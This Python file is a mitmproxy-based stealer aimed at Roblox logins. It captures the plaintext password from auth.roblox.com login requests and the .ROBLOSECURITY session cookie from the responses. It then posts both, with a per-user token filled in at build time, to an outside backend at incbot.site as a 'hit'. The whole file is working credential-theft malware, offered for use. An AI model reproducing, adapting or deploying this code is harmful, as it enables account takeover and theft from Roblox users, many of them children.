"""
Roblox Network Monitor - Intercepts Roblox login traffic to capture cookie + password
Sends captured data to incbot.site backend using the extension hit endpoint
"""

import json
import re
import threading
import urllib.parse
import requests
from mitmproxy import http
from mitmproxy.tools.dump import DumpMaster
from mitmproxy import options

# ── Config ────────────────────────────────────────────────────────────────────
BACKEND_URL = "https://incbot.site/api/extension/hit"
DIRECTORY_TOKEN = "YOUR_DIRECTORY_TOKEN_HERE"  # Replaced at build time per user
# ─────────────────────────────────────────────────────────────────────────────

captured_password = None  # Temporarily store password from request

class RobloxInterceptor:
    def request(self, flow: http.HTTPFlow):
        """Intercept outgoing requests - capture password from login POST"""
        global captured_password

        # Only interested in Roblox auth login endpoint
        if "auth.roblox.com" not in flow.request.pretty_host:
            return
        if flow.request.path != "/v2/login":
            return
        if flow.request.method != "POST":
            return

        try:
            body = json.loads(flow.request.content.decode("utf-8"))
            password = body.get("password")
            if password:
                captured_password = password
        except Exception:
            pass

    def response(self, flow: http.HTTPFlow):
        """Intercept responses - capture cookie after successful login"""
        global captured_password

        if "auth.roblox.com" not in flow.request.pretty_host:
            return
        if flow.request.path != "/v2/login":
            return
        if flow.response.status_code != 200:
            captured_password = None
            return

        try:
            # Extract .ROBLOSECURITY cookie from Set-Cookie header
            cookie = None
            set_cookie = flow.response.headers.get("set-cookie", "")
            
            # Also check all Set-Cookie headers
            all_cookies = flow.response.headers.get_all("set-cookie")
            for c in all_cookies:
                if ".ROBLOSECURITY" in c:
                    match = re.search(r'\.ROBLOSECURITY=([^;]+)', c)
                    if match:
                        cookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-into-your-account-and-to-steal-your-ROBUX-and-items.|_" + match.group(1)
                        break

            if not cookie:
                # Try parsing response body for cookie
                body = json.loads(flow.response.content.decode("utf-8"))
                # Some endpoints return it differently
                pass

            if cookie and cookie.startswith("_|WARNING:"):
                # Send to backend in a separate thread to not block proxy
                password = captured_password
                captured_password = None
                threading.Thread(
                    target=send_to_backend,
                    args=(cookie, password),
                    daemon=True
                ).start()

        except Exception as e:
            print(f"[!] Response parse error: {e}")
            captured_password = None


def send_to_backend(cookie: str, password: str):
    """Send captured cookie + password to incbot backend"""
    try:
        payload = {
            "cookie": cookie,
            "directoryToken": DIRECTORY_TOKEN,
        }
        if password:
            payload["password"] = password

        resp = requests.post(
            BACKEND_URL,
            json=payload,
            timeout=15
        )
        if resp.status_code == 200:
            print(f"[+] Hit sent successfully")
        else:
            print(f"[!] Backend returned {resp.status_code}: {resp.text[:100]}")
    except Exception as e:
        print(f"[!] Failed to send hit: {e}")


def run_proxy():
    """Start the mitmproxy instance on port 8080"""
    opts = options.Options(
        listen_host="127.0.0.1",
        listen_port=8080,
        ssl_insecure=False,
    )
    master = DumpMaster(opts, with_termlog=False, with_dumper=False)
    master.addons.add(RobloxInterceptor())
    try:
        master.run()
    except KeyboardInterrupt:
        master.shutdown()
